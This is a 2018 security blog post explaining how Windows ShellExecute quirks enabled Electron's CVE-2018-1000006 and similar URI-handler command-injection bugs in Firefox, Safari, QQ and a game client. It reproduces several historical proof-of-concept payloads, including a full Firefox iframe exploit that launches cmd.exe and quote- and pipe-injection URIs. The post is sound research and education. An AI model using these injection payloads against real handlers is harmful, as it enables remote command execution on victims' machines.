---
layout:	post
title:	"Electron's Bug, ShellExecute to Blame?"
date:	2018-01-28
show_excerpt: true
---

So you have probably heard of Electron's remote command injection vulnerability [CVE-2018-1000006](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000006) in custom protocol handler. It's not too hard to reproduce the bug since the proof of concept is easily found in [the patch](https://github.com/electron/electron/commit/c49cb29ddf3368daf279bd60c007f9c015bc834c#diff-6428a7ecb6a3a2831eae23aee7efeac5R647). Actually the exploit has already been made public: [Exploiting Electron RCE in Exodus wallet](https://medium.com/@Wflki/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374).

Since there's enough detail for the vulnerability itself, let's talk about something else.

## TL;DR

There's two quirks in Win32 Api [ShellExecute](https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153%28v=vs.85%29.aspx) that leads developers to misuse, or even vulnerabilities:

* URI association command line can be broken by non-encoded spaces, quotes, and backslashes in the URI
* It's possible to confuse an application that a local path is a valid url, which leads to command execution

<!-- more -->

Custom url protocol is a common feature in Windows and macOS. On Windows, these protocols are registered in registry: [Registering an Application to a URI Scheme](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx) (MSDN).

For example, to associate alert: protocol to alert.exe, create following registry keys:

```
HKEY_CLASSES_ROOT
 alert
 (Default) = "URL:Alert Protocol"
 URL Protocol = ""
 DefaultIcon
 (Default) = "alert.exe,1"
 shell
 open
 command
 (Default) = "C:\Program Files\Alert\alert.exe" "%1"
```

The *%1* placeholder will be replaced with arguments from url. It is quoted incase there's a space or something that confuses CommandLineToArgvW, mistakenly split the filename or something else into multiple parts.

But there's a serious problem, even MSDN has warned clearly: [Security Issues](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx#prot_sec)

> When [ShellExecute](https://msdn.microsoft.com/en-us/library/cc422072.aspx) executes the pluggable protocol handler with a stringon the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++'s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters. To mitigate this issue:
>
>   Avoid spaces, quotes, or backslashes in your URI
>
>   Quote the %1 in the registration ("%1" as written in the 'alert' example registration)ShellExecute is an api for opening both URI and local paths.

So here's the root cause for CVE-2018-1000006. The exploit breaks command line with one single quote, then insert a new switch that electron main executable recognizes. Electron project is powered by Chromium, and the vulnerable version supports [Chromium Command Line Switches](https://peter.sh/experiments/chromium-command-line-switches/) as well. Seems like these following switches will launch arbitrary command:

* --renderer-cmd-prefix
* --gpu-launcher
* --utility-cmd-prefix
* --ppapi-plugin-launcher
* --nacl-gdb
* --ppapi-flash-path & --ppapi-flash-args

Let's see how Chromium itself mitigate the issue: add a double dash switch before user supplied arguments, treat all switch after it as invalid.

![](/img/iU2sCqmFJDqskkI2RmWWpA.png)The bug can be triggered from browser remotely. Both Internet Explorer 11 and Chromium open external URI by invoking ShellExecute api:

```
InternetExplorer 11

Breakpoint 3 hit
SHELL32!ShellExecuteExW:
00007ffc`6fad0ff0 48895c2408 mov qword ptr [rsp+8],rbx ss:00000072`e9eff790=0000000000000000
0:019> k
 # Child-SP RetAddr Call Site
00 00000072`e9eff788 00007ffc`4b4e34fc SHELL32!ShellExecuteExW
01 00000072`e9eff790 00007ffc`4b1f3466 IEFRAME!CShellExecWithHandlerParams::Execute+0xbc
02 00000072`e9eff840 00007ffc`6e7dd544 IEFRAME!BrokerShellExecWithHandlerThreadProc+0x146Chromium
```

[https://cs.chromium.org/chromium/src/chrome/browser/platform_util_win.cc?type=cs&sq=package:chromium&l=101](https://cs.chromium.org/chromium/src/chrome/browser/platform_util_win.cc?type=cs&sq=package:chromium&l=101)

```cpp
if (reinterpret_cast<ULONG_PTR>(ShellExecuteA(NULL, "open",
 escaped_url.c_str(), NULL, NULL,
 SW_SHOWNORMAL)) <= 32) {
```

Edge is an UWP app, which calls SHELL32!CDefFolderMenu::InvokeCommand

```
KERNEL32!CreateProcessWStub:
00007ffc`6ecae490 4c8bdc mov r11,rsp
0:007> k
 # Child-SP RetAddr Call Site
00 00000018`474fe0b8 00007ffc`6d81b0f7 KERNEL32!CreateProcessWStub
......
0e 00000018`474fee30 00007ffc`568c2ad7 SHELL32!CDefFolderMenu::InvokeCommand+0x13e
0f 00000018`474ff1a0 00007ffc`565fca55 twinui!CExecuteItem::Execute+0x1ab [onecoreuap\shell\lib\executeitem\executeitem.cpp @ 351]
10 00000018`474ff220 00007ffc`565fa5c8 twinui!CBrokeredLauncher::CLaunchHelper::_LaunchShellItemWithOptionsAndVerb+0x19d [shell\twinui\associationlaunch\lib\launcher.cpp @ 2352]
11 00000018`474ff3a0 00007ffc`565fcef8 twinui!CBrokeredLauncher::CLaunchHelper::_ExecuteItem+0x28 [shell\twinui\associationlaunch\lib\launcher.cpp @ 2308]
12 00000018`474ff3e0 00007ffc`565fa046 twinui!CBrokeredLauncher::CLaunchHelper::_LaunchWithWarning+0x3c8 [shell\twinui\associationlaunch\lib\launcher.cpp @ 2267]
13 00000018`474ff490 00007ffc`565fa3c1 twinui!CBrokeredLauncher::CLaunchHelper::_DoLaunch+0x3e [shell\twinui\associationlaunch\lib\launcher.cpp @ 2210]
14 00000018`474ff4c0 00007ffc`565f48a4 twinui!CBrokeredLauncher::CLaunchHelper::_DoLaunchOrFallback+0x32d [shell\twinui\associationlaunch\lib\launcher.cpp @ 2064]
15 00000018`474ff580 00007ffc`565ee094 twinui!CBrokeredLauncher::CLaunchHelper::LaunchUri+0xd0 [shell\twinui\associationlaunch\lib\launcher.cpp @ 1084]
```

The function `shell32!CDefFolderMenu::InvokeCommand` has the same quote behavior like ShellExecute.

Both URI protocol and file extension handlers are registered under HKEY_CLASSES_ROOT. Actually, they can be launched by the same way:

```c
ShellExecuteW(NULL, L"open", L"c:\\hello.txt", NULL, NULL, SW_SHOW); // to open a local file
ShellExecuteW(NULL, L"open", L"https://www.google.com", NULL, NULL, SW_SHOW); // to open a url
```

The only difference is the lpFile argument. So there's possibility that the developer wants to open a website in default browser, but actually launched a command instead.

After searching for a while, I found some interesting cases that related to ShellExecute and url protocol.

## MS07-061 (CVE-2007-3896)

[Microsoft Security Bulletin MS07-061 - Critical](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2007/ms07-061 "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2007/ms07-061")

> A remote code execution vulnerability exists in the way that the Windows shell handles specially crafted URIs that are passed to it. If the Windows shell did not sufficiently validate these URIs, an attacker could exploit this vulnerability and execute arbitrary code.

The advisory didn't give much detail, but according to a [TrendMicro article](https://www.trendmicro.com/vinfo/id/threat-encyclopedia/vulnerability/920/multiple-browser-uri-handlers-command-injection-vulnerabilities), CVE-2007-3896 and CVE-2007-3845 are variants of CVE-2007-4041, which can be found in BugZilla.

[389580 - (CVE-2007-4041) some schemes with %00 launch unexpected handlers on windows](https://bugzilla.mozilla.org/show_bug.cgi?id=389580#c17)

One of the test case:

```html
<a href="mailto:%../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat>Mailto:%</a>
```

At first the report is for Firefox, but soon they realized that it was a shell32 bug. The precent symbol broke everything. It was supposed to invoke a mail client, but somehow a command got executed. Damn!

## MS10-007 (CVE-2010-0027)

Three years after, another vulnerability in ShellExecute's inner implementation was found: <https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/ms10-007>

> The vulnerability could allow remote code execution if an application, such as a Web browser, passes specially crafted data to the ShellExecute API function through the Windows Shell Handler.This time sharp symbol broke it again:

`xyz://www.example.com#://../../C:/windows/system32/calc.exe`

## CVE-2007-3670

This is a argument injection affects both Firefox and ThunderBird.

* <https://www.mozilla.org/en-US/security/advisories/mfsa2007-23/>
* <https://bugzilla.mozilla.org/show_bug.cgi?id=384384>

Firefox registered `FirefoxURL` protocol:

```
[HKEY_CLASSES_ROOT\FirefoxURL\shell\open\command\@]
C:\\PROGRA~1\\MOZILL~2\\FIREFOX.EXE -url "%1″ -requestPending
```

Thor Larholm found a quote in url can inject extra command switch:

```
FirefoxURL://foo" --argument "my value
```

So he used a special switch -chrome which allows executing arbitrary javascript in a privileged domain.

<http://larholm.com/2007/07/10/internet-explorer-0day-exploit/>

His final exploit:

```html
<html><body>
<iframe src='firefoxurl://larholm.com" -chrome "javascript:C=Components.classes;I=Components.interfaces;
file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);
file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+
String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+
String.fromCharCode(92)+'cmd.exe');
process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);
process.init(file);
process.run(true,['/k%20echo%20hello%20from%20larholm.com'],1);
'><
</body></html>
```

**The electron bug follows exactly the same pattern with it: the quote in url, and code in command line switches.**

## CVE-2007-3186

Thor Larholm also found another exploit for Safari. The snippet below:

```html
<iframe src='myprotocol://someserver.com" < foo > bar | foobar "arg1'></iframe>
```

Will execute following command in a shell:

```
"C:\Program Files\My Application\myprotocol.exe" "someserver.com" < foo > bar | foobar "arg1"
```

But wait! Neither `ShellExecute` nor `CreateProcess` supports pipe operator. The only explanation should be, that Safari for Windows used function system to open external url.

## QQ 2012 remote Command Execution

[腾讯点开QQ消息 执行本地文件、命令 | WooYun-2012-07437 | WooYun.org**](http://cb.drops.wiki/bugs/wooyun-2012-07437.html "http://cb.drops.wiki/bugs/wooyun-2012-07437.html")

Around May 2012, a command execution bug was found and spread for fun. In the chat dialog of a famous IM, clicking on a domain name with malformed suffix will launch arbitrary local command in victim's system.

![](/img/qq-traversal.png)

The reason is that QQ adds links to domains without http(s) prefix, then pass the malformed URI to ShellExecute api. ShellExecute recognizes the payload as a relative path, so the calculator pops up.

This vulnerability is not ideal since the payload is visible to the victim, and it doesn't support cross partition path(many users install third party software other than system partition) or pass extra arguments to the executable.

Today you can still reproduce it on the latest Windows release, by typing following command to *Start / Run* dialog:

`www.baidu.com..\..\`

An explorer window will show up.

BTW, if you want to test the quirk of ShellExecuteEx, the following jscript works:

```js
var objShell = new ActiveXObject("shell.application");
WScript.Echo("Attach me...");
objShell.ShellExecute("www.baidu.com..\\..\\", "", "", "open", 1);
```

## `qqgameprotocol://` protocol Remote Command Execution

In the talk [Attack Surface Extended by URL Schemes](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf) from HITB 2017 by @rootredrain, he introduced a remote command execution bug in this game client implementation.

The exploit:

```
qqgameprotocol://shortcut/# URL=c:/windows/system32/http://qq.com/../../calc.exe ICON=3366xs.ico NAME=AAAAAAAA
DESC=BBBBB TYPE=1 START=1
```

In this URI protocol, the receiver application tried to parse a URL parameter and open it in the browser. The validation function checks substring instead of prefix, so the attacker use the keyword as part of the argument,then skip them with relative path.

![](/img/v1wjCoUp-forHNtpIQBHXg.png)

So the application was fooled and it pass the calculator to ShellExecute. Boom!

### More Schemes, Please

The book [Hacking: The Next Generation](http://shop.oreilly.com/product/9780596154585.do) (2009) introduces how to search URI protocol handlers on Mac OSX, Windows and some Linux distribution. You can read the chapter [Blended Threats: When Applications Exploit Each Other](https://www.safaribooksonline.com/library/view/hacking-the-next/9780596806309/ch04.html) online.

The vbs script for enumerating Windows url scheme handlers still works. MacOS X version needs slightly modified to compile.

Here's my modified version:

<https://github.com/ChiChou/LookForSchemes/blob/master/schemes.m>

```objectivec
/*
 to compile: clang -fmodules schemes.m -o schemes
 then run `./schemes`
*/

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

extern OSStatus _LSCopySchemesAndHandlerURLs(CFArrayRef *outSchemes, CFArrayRef *outApps);
extern OSStatus _LSCopyAllApplicationURLs(CFArrayRef *theList);

int main(int argc, const char * argv[]) {
  @autoreleasepool {
    CFArrayRef schemes;
    CFArrayRef apps;
    NSWorkspace *workspace = [NSWorkspace sharedWorkspace];
    _LSCopySchemesAndHandlerURLs(&schemes, &apps);
    for (CFIndex i = 0, count = CFArrayGetCount(schemes); i < count; i++) {
      CFStringRef scheme = CFArrayGetValueAtIndex(schemes, i);
      CFArrayRef handlers = LSCopyAllHandlersForURLScheme(scheme);
      NSLog(@"%@:", scheme);

      for (CFIndex j = 0, bundle_count = CFArrayGetCount(handlers); j < bundle_count; j++) {
        CFStringRef handler = CFArrayGetValueAtIndex(handlers, j);
        NSLog(@"\t%@ (%@)", handler, [workspace absolutePathForAppBundleWithIdentifier:(__bridge NSString *)handler]);
      }
    }
    NSLog(@"\n");
  }
  return 0;
}
```

Windows:

<https://github.com/ChiChou/LookForSchemes/blob/master/AppSchemes.cpp>

You can see many interesting protocols in the list. Will there be any new bug to be discovered?

### References

[1]. [Registering an Application to a URI Scheme](https://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx)
[2]. [About Dynamic Data Exchange](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774%28v=vs.85%29.aspx)
[3]. [Microsoft Security Bulletin MS07-061 — Critical](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2007/ms07-061)
[4]. <https://www.trendmicro.com/vinfo/id/threat-encyclopedia/vulnerability/920/multiple-browser-uri-handlers-command-injection-vulnerabilities>
[5]. [Microsoft Security Bulletin MS10-007 — Critical](https://technet.microsoft.com/library/security/ms10-007)
[6]. [URI Use and Abuse](https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf)
[7]. [Attack Surface Extended by URL Schemes](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf)

